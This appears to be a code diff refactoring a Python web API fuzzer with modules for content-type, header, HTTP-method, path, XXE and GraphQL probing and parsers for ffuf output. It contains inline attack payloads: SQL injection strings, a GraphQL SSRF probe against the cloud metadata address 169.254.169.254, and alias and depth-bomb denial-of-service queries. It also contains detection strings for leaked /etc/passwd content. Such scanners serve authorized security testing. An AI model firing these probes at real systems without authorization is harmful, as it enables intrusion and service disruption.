-        bl_resp = requests.request(
-            method, url,
-            headers={**base_headers, "Content-Type": "application/json"},
-            data=base_body or '{"test":"fuzz"}',
-            timeout=timeout, verify=False,
-        )
-        bl_status = bl_resp.status_code
-        bl_len    = len(bl_resp.content)
-    except Exception:
-        bl_status, bl_len = None, None
-
-    for ct in CONTENT_TYPES_TO_FUZZ:
-
-        # Build body appropriate for content type
-        if "xml" in ct:
-            body = '<?xml version="1.0"?><root><test>fuzz</test></root>'
-        elif "form" in ct:
-            body = "test=fuzz&id=1"
-        elif "json" in ct:
-            body = base_body or '{"test":"fuzz"}'
-        elif "graphql" in ct:
-            body = '{"query":"{__typename}"}'
-        else:
-            body = base_body or "test=fuzz"
-
-        start = time.time()
-        try:
-            resp = requests.request(
-                method, url,
-                headers={**base_headers, "Content-Type": ct},
-                data=body,
-                timeout=timeout,
-                verify=False,
-                allow_redirects=False,
-            )
-            elapsed = round(time.time() - start, 3)
-            resp_headers = {k.lower(): v for k, v in resp.headers.items()}
-
-            fr = FuzzResult(
-                url=url,
-                method=method,
-                payload=ct,
-                payload_type="content_type",
-                status_code=resp.status_code,
-                content_length=len(resp.content),
-                response_time=elapsed,
-                content_type=resp_headers.get("content-type", ""),
-            )
-
-            # Accepted = not 415 (Unsupported Media Type)
-            if resp.status_code != 415:
-                result.accepted_types.append(ct)
-                fr.interesting = True
-
-                # XXE via XML type
-                if "xml" in ct and resp.status_code in (200, 500):
-                    if any(kw in resp.text.lower() for kw in
-                           ["root:", "etc/passwd", "xml"]):
-                        fr.finding_type = "xxe_potential"
-                        fr.severity     = "high"
-                        fr.evidence.append(
-                            f"XML content-type accepted → potential XXE"
-                        )
-                        result.bypassed = True
-
-                # Type confusion bypass
-                if bl_status and bl_status in (401, 403):
-                    if resp.status_code in (200, 201, 204):
-                        fr.finding_type = "content_type_bypass"
-                        fr.severity     = "high"
-                        fr.evidence.append(
-                            f"Content-type bypass: '{ct}' → {resp.status_code}"
-                        )
-                        result.bypassed = True
-                        result.evidence.append(
-                            f"Bypass with Content-Type: {ct}"
-                        )
-
-                # Size anomaly
-                if bl_len and abs(len(resp.content) - bl_len) > 200:
-                    fr.evidence.append(
-                        f"Size difference: baseline={bl_len}, "
-                        f"this={len(resp.content)}"
-                    )
-
-            result.results.append(fr)
-
-        except Exception:
-            pass
-
-    return result
-
-
-def fuzz_path_params(
-    base_url: str,
-    path_template: str,
-    headers: dict[str, str],
-    payloads: list[tuple[str, str, str]],
-    timeout: int = 8,
-) -> list[FuzzResult]:
-    """
-    Fuzz path segments.
-    e.g. /api/users/FUZZ → /api/users/../admin
-    """
-    results: list[FuzzResult] = []
-
-    # Baseline
-    try:
-        bl_url  = base_url.rstrip("/") + path_template.replace("FUZZ", "1")
-        bl_resp = requests.get(bl_url, headers=headers,
-                               timeout=timeout, verify=False)
-        bl_status = bl_resp.status_code
-        bl_len    = len(bl_resp.content)
-    except Exception:
-        bl_status, bl_len = None, None
-
-    for payload, label, cat in payloads:
-        # URL-encode payload for path
-        safe_payload = payload.replace("/", "%2F").replace("?", "%3F") \
-            if cat != "path_traversal" else payload
-
-        fuzz_path = path_template.replace("FUZZ", safe_payload)
-        url = base_url.rstrip("/") + fuzz_path
-
-        start = time.time()
-        try:
-            resp = requests.get(
-                url, headers=headers, timeout=timeout,
-                verify=False, allow_redirects=False,
-            )
-            elapsed = round(time.time() - start, 3)
-            result  = analyze_response(
-                url=url,
-                method="GET",
-                payload=payload,
-                payload_type=cat,
-                label=label,
-                resp_status=resp.status_code,
-                resp_body=resp.text[:3000],
-                resp_headers={k.lower(): v for k, v in resp.headers.items()},
-                resp_time=elapsed,
-                baseline_status=bl_status,
-                baseline_len=bl_len,
-            )
-            if result.interesting or result.error_detected:
-                results.append(result)
-
-        except requests.exceptions.Timeout:
-            if "sleep" in label or "time" in label:
-                results.append(FuzzResult(
-                    url=url, method="GET",
-                    payload=payload[:100], payload_type=cat,
-                    response_time=timeout,
-                    interesting=True,
-                    finding_type="time_based_injection",
-                    severity="high",
-                    evidence=[f"Path timeout: {label}"],
-                ))
-        except Exception:
-            pass
-
-    return results
-
-
-def fuzz_headers(
-    url: str,
-    method: str,
-    base_headers: dict[str, str],
-    payloads: list[tuple[str, str, str]],
-    timeout: int = 8,
-) -> list[FuzzResult]:
-    """
-    Inject payloads into common HTTP headers.
-    User-Agent, Referer, X-Forwarded-For, Host, etc.
-    """
-    results: list[FuzzResult] = []
-
-    injectable_headers = [
-        "User-Agent", "Referer", "X-Forwarded-For",
-        "X-Real-IP", "Accept-Language", "Accept",
-        "Host", "X-Api-Key", "X-Custom-Header",
-        "Authorization", "Cookie",
-    ]
-
-    # Baseline
-    try:
-        bl = requests.request(method, url, headers=base_headers,
-                              timeout=timeout, verify=False)
+        _LIMITER.acquire()
+        bl        = _body_request(sess, method, url, body_fields, body_type, ct, timeout)
         bl_status = bl.status_code
         bl_len    = len(bl.content)
     except Exception:
-        bl_status, bl_len = None, None
+        pass
 
-    # Only test injection-relevant payloads in headers
-    header_relevant_cats = {"sqli", "xss", "ssti", "ssrf", "cmdi", "overflow"}
-    header_payloads = [
-        (p, l, c) for p, l, c in payloads
-        if c in header_relevant_cats
-    ][:50]  # cap header fuzzing
-
-    for hdr_name in injectable_headers[:6]:  # cap headers
-        for payload, label, cat in header_payloads[:15]:
-            test_headers = {**base_headers, hdr_name: payload}
-            start = time.time()
+    for field in list(body_fields.keys()):
+        stop = False
+        for payload, label, cat in payloads:
+            if stop:
+                break
+            _LIMITER.acquire()
+            fuzz_f = {**body_fields, field: payload}
+            t0 = time.monotonic()
             try:
-                resp = requests.request(
-                    method, url, headers=test_headers,
-                    timeout=timeout, verify=False,
-                    allow_redirects=False,
+                r = _body_request(sess, method, url, fuzz_f, body_type, ct, timeout)
+                f = _confirm(
+                    url=url, method=method, param=field,
+                    payload=payload, label=label, cat=cat,
+                    status=r.status_code,
+                    body=r.text[:3000],
+                    hdrs={k.lower(): v for k, v in r.headers.items()},
+                    elapsed=time.monotonic() - t0,
+                    bl_status=bl_status, bl_len=bl_len,
                 )
-                elapsed = round(time.time() - start, 3)
-                result  = analyze_response(
-                    url=url,
-                    method=method,
-                    payload=payload,
-                    payload_type=cat,
-                    label=label,
-                    resp_status=resp.status_code,
-                    resp_body=resp.text[:3000],
-                    resp_headers={k.lower(): v
-                                  for k, v in resp.headers.items()},
-                    resp_time=elapsed,
-                    baseline_status=bl_status,
-                    baseline_len=bl_len,
-                    param_name=f"header:{hdr_name}",
-                )
-                if result.interesting or result.error_detected:
-                    result.evidence.insert(
-                        0, f"Injected via header '{hdr_name}'"
-                    )
-                    results.append(result)
+                if f and _DEDUP.is_new(f):
+                    findings.append(f)
+                    if f.severity in _EARLY_EXIT:
+                        stop = True
 
-            except requests.exceptions.Timeout:
-                if "sleep" in label or "time" in label:
-                    results.append(FuzzResult(
-                        url=url, method=method,
-                        payload=payload[:100], payload_type=cat,
-                        param_name=f"header:{hdr_name}",
-                        response_time=timeout,
-                        interesting=True,
-                        finding_type="time_based_injection",
-                        severity="high",
-                        evidence=[f"Header '{hdr_name}' timeout: {label}"],
-                    ))
+            except requests.Timeout:
+                if any(k in label for k in ("sleep", "waitfor", "delay")):
+                    f = Finding(
+                        url=url, method=method, param=field,
+                        payload=payload[:100], vuln_type="time_based_injection",
+                        severity="high", resp_time=float(timeout),
+                        evidence=[f"Body '{field}': timeout on '{label}'"],
+                    ).stamp()
+                    if _DEDUP.is_new(f):
+                        findings.append(f)
+            except Exception as e:
+                log.debug("body_params: %s", e)
+
+    return findings
+
+
+# ─── HTTP method fuzzing ────────────────────────────────────────────────────
+
+_DANGEROUS_METHODS = {"TRACE", "DEBUG", "CONNECT", "PROPFIND",
+                      "PROPPATCH", "COPY", "MOVE"}
+_WRITE_METHODS     = {"PUT", "DELETE", "PATCH"}
+
+
+def fuzz_methods(
+    url:     str,
+    sess:    requests.Session,
+    timeout: int = 8,
+    methods: Optional[list[str]] = None,
+    quick:   bool = False,
+) -> MethodResult:
+    result = MethodResult(endpoint=url)
+
+    # OPTIONS probe first
+    try:
+        _LIMITER.acquire()
+        o = sess.options(url, timeout=timeout)
+        allow = o.headers.get("Allow") or o.headers.get("Access-Control-Allow-Methods") or ""
+        if allow:
+            result.evidence.append(f"OPTIONS Allow: {allow}")
+    except Exception:
+        pass
+
+    methods_to_test = methods or _ALL_METHODS
+    for method in methods_to_test:
+        _LIMITER.acquire()
+        try:
+            data = "fuzz" if method in ("POST", "PUT", "PATCH") else None
+            r    = sess.request(method, url, data=data,
+                                timeout=timeout, allow_redirects=False)
+            if r.status_code not in (405, 501, 404, 403, 400):
+                if method in _DANGEROUS_METHODS:
+                    result.vulnerable = True
+                    result.unexpected.append(method)
+                    result.evidence.append(f"DANGEROUS {method} → {r.status_code}")
+                elif method in _WRITE_METHODS and r.status_code in (200, 201, 204):
+                    result.vulnerable = True
+                    result.unexpected.append(method)
+                    result.evidence.append(f"WRITE {method} → {r.status_code}")
+        except Exception:
+            pass
+
+    if not quick:
+        # Method override checks are useful but can be expensive on slow targets.
+        for hdr, m in {
+            "X-HTTP-Method-Override": "DELETE",
+            "X-Method-Override":      "PUT",
+            "_method":                "DELETE",
+        }.items():
+            try:
+                _LIMITER.acquire()
+                r1 = sess.get(url, headers={hdr: m}, timeout=timeout)
+                _LIMITER.acquire()
+                r2 = sess.get(url, timeout=timeout)
+                if r1.status_code != r2.status_code:
+                    result.vulnerable = True
+                    result.evidence.append(
+                        f"Override '{hdr}: {m}' → {r2.status_code} became {r1.status_code}"
+                    )
             except Exception:
                 pass
 
-    return results
+    return result
 
+
+# ─── Content-type fuzzing ───────────────────────────────────────────────────
+
+def fuzz_content_types(
+    url:      str,
+    method:   str,
+    body:     str,
+    sess:     requests.Session,
+    timeout:  int = 8,
+) -> ContentTypeResult:
+    result = ContentTypeResult(endpoint=url, method=method)
+
+    bl_status = None
+    try:
+        _LIMITER.acquire()
+        bl        = sess.request(method, url,
+                                 headers={"Content-Type": "application/json"},
+                                 data=body or '{"test":"fuzz"}',
+                                 timeout=timeout)
+        bl_status = bl.status_code
+    except Exception:
+        pass
+
+    for ct in _CONTENT_TYPES:
+        body_for_ct = (
+            '<?xml version="1.0"?><root><test>fuzz</test></root>'
+            if "xml" in ct else
+            '{"query":"{__typename}"}' if "graphql" in ct else
+            "test=fuzz&id=1" if "form" in ct else
+            body or '{"test":"fuzz"}'
+        )
+        _LIMITER.acquire()
+        try:
+            r = sess.request(method, url,
+                             headers={"Content-Type": ct},
+                             data=body_for_ct,
+                             timeout=timeout, allow_redirects=False)
+            if r.status_code != 415:
+                result.accepted.append(ct)
+
+                if "xml" in ct and r.status_code in (200, 500):
+                    if any(kw in r.text.lower() for kw in
+                           ["root:", "etc/passwd"]):
+                        result.bypassed = True
+                        result.evidence.append(f"XXE potential via {ct}")
+
+                if bl_status in (401, 403) and r.status_code in (200, 201, 204):
+                    result.bypassed = True
+                    result.evidence.append(
+                        f"Auth bypass via Content-Type: {ct} → {r.status_code}"
+                    )
+        except Exception:
+            pass
+
+    return result
+
+
+# ─── Header injection ───────────────────────────────────────────────────────
+
+_INJECTABLE_HEADERS = [
+    "User-Agent", "Referer", "X-Forwarded-For",
+    "X-Real-IP", "Accept-Language", "Accept",
+]
+_HDR_CATS = {"sqli", "xss", "ssti", "ssrf", "cmdi"}
+
+
+def fuzz_headers(
+    url:      str,
+    method:   str,
+    sess:     requests.Session,
+    payloads: list[tuple[str, str, str]],
+    timeout:  int = 8,
+) -> list[Finding]:
+    findings: list[Finding] = []
+    bl_status, bl_len = _baseline(sess, method, url, None, None, timeout)
+
+    hdr_payloads = [(p, l, c) for p, l, c in payloads if c in _HDR_CATS][:40]
+
+    for hdr in _INJECTABLE_HEADERS:
+        for payload, label, cat in hdr_payloads[:12]:
+            _LIMITER.acquire()
+            t0 = time.monotonic()
+            try:
+                r = sess.request(method, url, headers={hdr: payload},
+                                 timeout=timeout, allow_redirects=False)
+                f = _confirm(
+                    url=url, method=method, param=f"header:{hdr}",
+                    payload=payload, label=label, cat=cat,
+                    status=r.status_code,
+                    body=r.text[:3000],
+                    hdrs={k.lower(): v for k, v in r.headers.items()},
+                    elapsed=time.monotonic() - t0,
+                    bl_status=bl_status, bl_len=bl_len,
+                )
+                if f and _DEDUP.is_new(f):
+                    f.evidence.insert(0, f"Via header '{hdr}'")
+                    findings.append(f)
+            except Exception:
+                pass
+
+    return findings
+
+
+# ─── XXE fuzzing ────────────────────────────────────────────────────────────
 
 def fuzz_xxe(
-    url: str,
-    method: str,
-    base_headers: dict[str, str],
+    url:     str,
+    method:  str,
+    sess:    requests.Session,
     timeout: int = 10,
-) -> list[FuzzResult]:
-    """
-    Dedicated XXE fuzzer — sends XML payloads with XXE entities.
-    Tests both file:// and SSRF via XXE.
-    """
-    results: list[FuzzResult] = []
+) -> list[Finding]:
+    findings: list[Finding] = []
+    xml_hdrs = {"Content-Type": "application/xml",
+                "Accept":       "application/xml, text/xml, */*"}
 
-    xml_headers = {
-        **base_headers,
-        "Content-Type": "application/xml",
-        "Accept":       "application/xml, text/xml, */*",
-    }
+    indicators = ["root:x:0:0", "daemon:x:", "ami-id", "computeMetadata", "[fonts]"]
 
-    for item in XXE_PAYLOADS:
-        payload = item["payload"]
-        label   = item["label"]
-        start   = time.time()
-
+    for payload, label in _P["xxe"]:
+        _LIMITER.acquire()
+        t0 = time.monotonic()
         try:
-            resp = requests.request(
-                method, url,
-                headers=xml_headers,
-                data=payload.encode("utf-8"),
-                timeout=timeout,
-                verify=False,
-                allow_redirects=False,
-            )
-            elapsed = round(time.time() - start, 3)
-            body    = resp.text[:3000]
+            r = sess.request(method, url, headers=xml_hdrs,
+                             data=payload.encode(),
+                             timeout=timeout, allow_redirects=False)
+            body = r.text[:3000]
+            hit  = any(ind in body for ind in indicators)
 
-            # Check for XXE success indicators
-            is_vuln = any(indicator in body for indicator in [
-                "root:x:0:0", "daemon:x:", "nobody:",
-                "ami-id", "computeMetadata",
-                "[fonts]", "[extensions]",
-            ])
+            f = Finding(
+                url=url, method=method, payload=payload[:200],
+                vuln_type="xxe" if hit else "none",
+                severity="critical" if hit else "info",
+                status=r.status_code,
+                resp_time=round(time.monotonic() - t0, 3),
+                resp_size=len(r.content),
+                snippet=body[:300],
+                interesting=hit or r.status_code == 500,
+                evidence=(["XXE confirmed: file/metadata in response"] if hit else
+                          ["500 on XML payload"] if r.status_code == 500 else []),
+            ) if (hit or r.status_code == 500) else None
 
-            fr = FuzzResult(
-                url=url,
-                method=method,
-                payload=payload[:200],
-                payload_type="xxe",
-                status_code=resp.status_code,
-                content_length=len(resp.content),
-                response_time=elapsed,
-                response_snippet=body[:300],
-                interesting=is_vuln or resp.status_code == 500,
-                error_detected=is_vuln,
-                finding_type="xxe" if is_vuln else "none",
-                severity="critical" if is_vuln else "info",
-            )
-            if is_vuln:
-                fr.evidence.append(
-                    f"XXE success: file content or metadata in response"
-                )
-            elif resp.status_code == 500:
-                fr.evidence.append("500 error on XML payload — parser may exist")
-
-            if fr.interesting:
-                results.append(fr)
-
+            if f and _DEDUP.is_new(f):
+                findings.append(f)
         except Exception:
             pass
 
-    return results
+    return findings
 
+
+# ─── Path param fuzzing ─────────────────────────────────────────────────────
+
+def fuzz_path_params(
+    base_url:  str,
+    template:  str,
+    sess:      requests.Session,
+    payloads:  list[tuple[str, str, str]],
+    timeout:   int = 8,
+) -> list[Finding]:
+    findings: list[Finding] = []
+
+    bl_status, bl_len = None, None
+    try:
+        _LIMITER.acquire()
+        bl = sess.get(base_url.rstrip("/") + template.replace("FUZZ", "1"),
+                      timeout=timeout)
+        bl_status = bl.status_code
+        bl_len    = len(bl.content)
+    except Exception:
+        pass
+
+    for payload, label, cat in payloads:
+        safe = payload if cat == "lfi" else \
+            payload.replace("/", "%2F").replace("?", "%3F")
+        url = base_url.rstrip("/") + template.replace("FUZZ", safe)
+        _LIMITER.acquire()
+        t0 = time.monotonic()
+        try:
+            r = sess.get(url, timeout=timeout, allow_redirects=False)
+            f = _confirm(
+                url=url, method="GET", param="path:FUZZ",
+                payload=payload, label=label, cat=cat,
+                status=r.status_code,
+                body=r.text[:3000],
+                hdrs={k.lower(): v for k, v in r.headers.items()},
+                elapsed=time.monotonic() - t0,
+                bl_status=bl_status, bl_len=bl_len,
+            )
+            if f and _DEDUP.is_new(f):
+                findings.append(f)
+        except Exception:
+            pass
+
+    return findings
+
+
+# ─── GraphQL fuzzing ────────────────────────────────────────────────────────
 
 def fuzz_graphql(
-    url: str,
-    headers: dict[str, str],
+    url:     str,
+    sess:    requests.Session,
     timeout: int = 8,
-) -> list[FuzzResult]:
-    """
-    Fuzz GraphQL endpoints with injection payloads.
-    Tests: field injection, alias attacks, depth limit, batch injection.
-    """
-    results: list[FuzzResult] = []
+) -> list[Finding]:
+    findings: list[Finding] = []
+    gh = {"Content-Type": "application/json"}
 
-    gql_headers = {
-        **headers,
-        "Content-Type": "application/json",
-    }
+    # Introspection
+    intro_q = {"query": "{ __schema { types { name kind fields { name args { name } } } } }"}
+    field_count = 0
+    try:
+        _LIMITER.acquire()
+        ir = sess.post(url, json=intro_q, headers=gh, timeout=timeout)
+        if ir.status_code == 200:
+            types = (ir.json().get("data") or {}).get("__schema", {}).get("types", [])
+            field_count = sum(
+                len(t.get("fields") or []) for t in types
+                if t.get("kind") == "OBJECT" and not t["name"].startswith("__")
+            )
+            if field_count:
+                f = Finding(
+                    url=url, method="POST",
+                    payload="introspection",
+                    vuln_type="graphql_introspection_enabled",
+                    severity="medium", status=ir.status_code,
+                    evidence=[f"Introspection enabled — {field_count} fields exposed"],
+                ).stamp()
+                if _DEDUP.is_new(f):
+                    findings.append(f)
+    except Exception:
+        pass
 
-    gql_payloads = [
-        # Injection in GQL args
-        {"query": '{ user(id: "1 OR 1=1") { id email } }',
-         "label": "gql_sqli_id"},
-        {"query": '{ user(id: "\'") { id } }',
-         "label": "gql_sqli_quote"},
-        # Alias amplification (DoS)
-        {"query": " ".join([
-            f'alias{i}: user(id: 1) {{ id email }}' for i in range(100)
-        ]),
-         "label": "gql_alias_dos"},
-        # Depth bomb
-        {"query": "{ " + "user { friend { " * 15 + "id" + " } }" * 15 + " }",
-         "label": "gql_depth_bomb"},
-        # Batch injection
-        [{"query": '{ __typename }'}] * 50,
-        # SSRF via URL argument
-        {"query": '{ fetch(url: "http://169.254.169.254/latest/meta-data/") { data } }',
-         "label": "gql_ssrf"},
-        # Introspection (should be disabled in prod)
-        {"query": "{ __schema { types { name } } }",
-         "label": "gql_introspection"},
-        # Null bytes
-        {"query": "{ user(id: \"\x00\") { id } }",
-         "label": "gql_null_byte"},
+    # Injection probes
+    probes = [
+        ({"query": '{ user(id: "1 OR 1=1") { id email } }'},            "gql_sqli"),
+        ({"query": '{ user(id: "\'") { id } }'},                        "gql_sqli_q"),
+        ({"query": " ".join(f'a{i}:user(id:1){{id}}' for i in range(50))}, "gql_alias_dos"),
+        ({"query": "{ " + "user { friend { " * 12 + "id" + " } }" * 12 + " }"},
+                                                                          "gql_depth"),
+        ([{"query": "{ __typename }"}] * 30,                             "gql_batch"),
+        ({"query": '{ fetch(url:"http://169.254.169.254/latest/meta-data/"){data} }'},
+                                                                          "gql_ssrf"),
     ]
 
-    for payload in gql_payloads:
-        label = payload.get("label", "gql_fuzz") \
-            if isinstance(payload, dict) else "gql_batch"
-        start = time.time()
+    for payload, label in probes:
+        _LIMITER.acquire()
+        t0 = time.monotonic()
         try:
-            resp = requests.post(
-                url, json=payload,
-                headers=gql_headers,
-                timeout=timeout,
-                verify=False,
-            )
-            elapsed = round(time.time() - start, 3)
-            body    = resp.text[:3000]
-
-            interesting = any([
-                resp.status_code == 500,
-                elapsed > 2.5,
-                any(sig in body.lower() for sig in
-                    ["sql", "error", "exception", "traceback",
-                     "root:x:", "ami-id"]),
-                "errors" in body.lower() and resp.status_code == 200,
-            ])
-
-            fr = FuzzResult(
-                url=url,
-                method="POST",
-                payload=json.dumps(payload)[:200],
-                payload_type="graphql",
-                status_code=resp.status_code,
-                content_length=len(resp.content),
-                response_time=elapsed,
-                response_snippet=body[:300],
-                interesting=interesting,
-                finding_type="graphql_injection" if interesting else "none",
-                severity="high" if interesting else "info",
-            )
-            if interesting:
-                fr.evidence.append(
-                    f"GraphQL fuzz: label={label}, "
-                    f"status={resp.status_code}, time={elapsed:.2f}s"
-                )
-                results.append(fr)
-
-        except requests.exceptions.Timeout:
-            if "dos" in label or "depth" in label or "batch" in label:
-                results.append(FuzzResult(
+            r = sess.post(url, json=payload, headers=gh, timeout=timeout)
+            elapsed = time.monotonic() - t0
+            body    = r.text[:3000]
+            hit = (r.status_code == 500 or elapsed > 2.5 or
+                   any(s in body.lower() for s in
+                       ["sql", "exception", "traceback", "root:x:", "ami-id"]))
+            if hit:
+                f = Finding(
                     url=url, method="POST",
-                    payload=json.dumps(payload)[:100],
-                    payload_type="graphql",
-                    response_time=timeout,
-                    interesting=True,
-                    finding_type="graphql_dos",
+                    payload=json.dumps(payload)[:200],
+                    vuln_type="graphql_injection",
+                    severity="high", status=r.status_code,
+                    resp_time=round(elapsed, 3),
+                    snippet=body[:300],
+                    evidence=[f"[{label}] status={r.status_code} t={elapsed:.2f}s"],
+                ).stamp()
+                if _DEDUP.is_new(f):
+                    findings.append(f)
+
+        except requests.Timeout:
+            if any(k in label for k in ("dos", "depth", "batch", "alias")):
+                f = Finding(
+                    url=url, method="POST",
+                    payload=label,
+                    vuln_type="graphql_dos",
                     severity="medium",
-                    evidence=[f"GraphQL timeout: {label} — possible DoS"],
-                ))
-        except Exception:
-            pass
+                    resp_time=float(timeout),
+                    evidence=[f"Timeout on '{label}' — DoS possible"],
+                ).stamp()
+                if _DEDUP.is_new(f):
+                    findings.append(f)
+        except Exception as e:
+            log.debug("graphql: %s", e)
 
-    return results
+    return findings
 
 
-# ══════════════════════════════════════════════════════════════
-# 6. PARSERS
-# ══════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════════════
+# §9  TOOL PARSERS  (ffuf)
+# ══════════════════════════════════════════════════════════════════════════════
 
-def parse_ffuf_fuzz(stdout: str, stderr: str,
-                    target: str) -> list[FuzzResult]:
-    """
-    Parse ffuf JSON output from fuzzing run.
-    ffuf -json outputs: {"results": [{url, status, length, words, lines}]}
-    """
-    results: list[FuzzResult] = []
+_INTERESTING = {200, 201, 202, 204, 301, 302, 307, 308,
+                401, 403, 405, 415, 422, 500, 501, 502}
 
-    # Full JSON object
+def _parse_ffuf(stdout: str, target: str) -> list[Finding]:
+    out: list[Finding] = []
+
+    def _make(url: str, status: int, length: int, fuzz: str) -> Optional[Finding]:
+        if status not in _INTERESTING or status == 404:
+            return None
+        return Finding(
+            url=url, method="GET",
+            payload=fuzz[:200], vuln_type="wordlist_hit",
+            severity="medium" if status in (200, 201) else "info",
+            status=status, resp_size=length,
+            evidence=[f"ffuf status={status} size={length}"],
+        ).stamp()
+
     try:
         data = json.loads(stdout)
         for r in data.get("results", []):
-            url    = r.get("url", "")
-            status = r.get("status", 0)
-            length = r.get("length", 0)
-            words  = r.get("words", 0)
-            lines  = r.get("lines", 0)
-            inp    = r.get("input", {})
-            fuzz   = inp.get("FUZZ", b"").decode() \
-                if isinstance(inp.get("FUZZ"), bytes) \
-                else inp.get("FUZZ", "")
-
-            interesting = status in INTERESTING_STATUS and status != 404
-            fr = FuzzResult(
-                url=url,
-                method=r.get("method", "GET"),
-                payload=fuzz[:200],
-                payload_type="wordlist",
-                status_code=status,
-                content_length=length,
-                interesting=interesting,
-                finding_type="wordlist_hit" if interesting else "none",
-                severity="medium" if status in (200, 201) else "info",
-                evidence=[
-                    f"ffuf: status={status}, "
-                    f"size={length}, words={words}, lines={lines}"
-                ],
-            )
-            if interesting:
-                results.append(fr)
-        return results
+            inp  = r.get("input", {})
+            fuzz = inp.get("FUZZ", b"")
+            if isinstance(fuzz, bytes):
+                fuzz = fuzz.decode(errors="replace")
+            f = _make(r.get("url", ""), r.get("status", 0),
+                      r.get("length", 0), fuzz)
+            if f and _DEDUP.is_new(f):
+                out.append(f)
+        return out
     except json.JSONDecodeError:
         pass
-
-    # Line-by-line JSON
-    for line in stdout.splitlines():
-        line = line.strip()
-        if not line or not line.startswith("{"):
-            continue
-        try:
-            r      = json.loads(line)
-            url    = r.get("url", "")
-            status = r.get("status", 0)
-            fuzz   = r.get("input", {}).get("FUZZ", "")
-            if isinstance(fuzz, bytes):
-                fuzz = fuzz.decode()
-
-            if url and status in INTERESTING_STATUS:
-                results.append(FuzzResult(
-                    url=url,
-                    method="GET",
-                    payload=fuzz[:200],
-                    payload_type="wordlist",
-                    status_code=status,
-                    content_length=r.get("length", 0),
-                    interesting=True,
-                    severity="medium",
-                    evidence=[f"ffuf line: status={status}"],
-                ))
-        except json.JSONDecodeError:
-            continue
-
-    # Plain text
-    if not results:
-        pat = re.compile(
-            r"(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+)"
-        )
-        for line in stdout.splitlines():
-            m = pat.search(line)
-            if m:
-                status = int(m.group(2))
-                if status in INTERESTING_STATUS:
-                    url = target.rstrip("/") + "/" + m.group(1).lstrip("/")
-                    results.append(FuzzResult(
-                        url=url,
-                        method="GET",
-                        payload=m.group(1),
-                        payload_type="wordlist",
-                        status_code=status,
-                        content_length=int(m.group(3)),
-                        interesting=True,
-                        severity="medium",
-                        evidence=[f"ffuf text: {line.strip()[:100]}"],
-                    ))
-
-    return results
-
-
-def parse_nuclei_fuzz(stdout: str, stderr: str) -> list[FuzzResult]:
-    """
-    Parse nuclei output from API fuzzing templates.
-    Supports JSON (-json) and plain text output.
-    """
-    results: list[FuzzResult] = []
 
     for line in stdout.splitlines():
         line = line.strip()
         if not line:
             continue
-
-        # JSON output
         try:
-            data = json.loads(line)
-            url      = (data.get("matched-at")
-                        or data.get("host")
-                        or data.get("input", ""))
-            template = data.get("template-id", "")
-            severity = data.get("info", {}).get("severity", "info").lower()
-            name     = data.get("info", {}).get("name", template)
-
-            # Map nuclei template to our payload type
-            ptype = "nuclei"
-            if "sqli" in template or "sql" in template:
-                ptype = "sqli"
-            elif "xss" in template:
-                ptype = "xss"
-            elif "ssrf" in template:
-                ptype = "ssrf"
-            elif "ssti" in template:
-                ptype = "ssti"
-            elif "lfi" in template or "traversal" in template:
-                ptype = "path_traversal"
-            elif "xxe" in template:
-                ptype = "xxe"
-
-            fr = FuzzResult(
-                url=url,
-                method=data.get("request", "").split(" ")[0] or "GET",
-                payload=template,
-                payload_type=ptype,
-                status_code=data.get("status-code"),
-                interesting=True,
-                finding_type=ptype,
-                severity=severity,
-                evidence=[
-                    f"nuclei: [{template}] {name}",
-                    f"Severity: {severity}",
-                ],
-                response_snippet=data.get("extracted-results", [""])[0][:200]
-                if data.get("extracted-results") else None,
-            )
-            results.append(fr)
-            continue
-
+            r    = json.loads(line)
+            fuzz = r.get("input", {}).get("FUZZ", "")
+            if isinstance(fuzz, bytes):
+                fuzz = fuzz.decode(errors="replace")
+            f = _make(r.get("url", ""), r.get("status", 0),
+                      r.get("length", 0), fuzz)
+            if f and _DEDUP.is_new(f):
+                out.append(f)
         except json.JSONDecodeError:
             pass
 
-        # Plain text: [severity] [template] URL
-        m = re.match(
-            r"\[([^\]]+)\]\s+\[([^\]]+)\]\s+\[([^\]]+)\]\s+(https?://\S+)",
-            line
-        )
-        if m:
-            severity = m.group(1).lower()
-            template = m.group(2)
-            _        = m.group(3)
-            url      = m.group(4)
-            results.append(FuzzResult(
-                url=url,
-                method="GET",
-                payload=template,
-                payload_type="nuclei",
-                interesting=True,
-                finding_type="nuclei_finding",
-                severity=severity,
-                evidence=[f"nuclei: {line}"],
-            ))
+    if not out:
+        for line in stdout.splitlines():
+            m = re.search(r"(\S+)\s+\[Status:\s*(\d+),\s*Size:\s*(\d+)", line)
+            if m:
+                status = int(m.group(2))
+                f = _make(target.rstrip("/") + "/" + m.group(1).lstrip("/"),
+                           status, int(m.group(3)), m.group(1))
+                if f and _DEDUP.is_new(f):
+                    out.append(f)
 
-    return results
+    return out
 
 
-# ══════════════════════════════════════════════════════════════
-# 7. EXECUTOR
-# ══════════════════════════════════════════════════════════════
+# ══════════════════════════════════════════════════════════════════════════════
+# §10  SUBPROCESS + TOOL CHECKS
+# ══════════════════════════════════════════════════════════════════════════════
 
-def safe_execute(cmd: list[str], timeout: int = 600) -> tuple[str, str, int]:
-    """Run subprocess safely — no shell, no injection."""
+def _run(cmd: list[str], timeout: int) -> tuple[str, str, int]:
     try:
-        result = subprocess.run(
-            cmd, capture_output=True, text=True,
-            timeout=timeout, shell=False,
-        )
-        return result.stdout, result.stderr, result.returncode
+        r = subprocess.run(cmd, capture_output=True, text=True,
+                           timeout=timeout, shell=False)
+        return r.stdout, r.stderr, r.returncode
     except subprocess.TimeoutExpired:
-        return "", f"Timed out after {timeout}s", -1
+        return "", f"Timeout after {timeout}s", -1
     except FileNotFoundError:
-        return "", f"Tool '{cmd[0]}' not installed", -1
+        return "", f"'{cmd[0]}' not on PATH", -1
     except Exception as e:
         return "", str(e), -1
 
 
-# ══════════════════════════════════════════════════════════════
-# 8. MAIN TOOL FUNCTION
-# ══════════════════════════════════════════════════════════════
+def _which(name: str) -> bool:
+    import shutil
+    return shutil.which(name) is not None
+
+
+def _ffuf_body(body: Optional[str], ct: str) -> str:
+    """Inject FUZZ marker into every value of a JSON or form body."""
+    if not body:
+        return '{"id":"FUZZ","user":"FUZZ"}' if "json" in ct else "id=FUZZ&user=FUZZ"
+    if "json" in ct:
+        try:
+            obj = json.loads(body)
+            if isinstance(obj, dict):
+                return json.dumps({k: "FUZZ" for k in obj})
+        except Exception:
+            pass
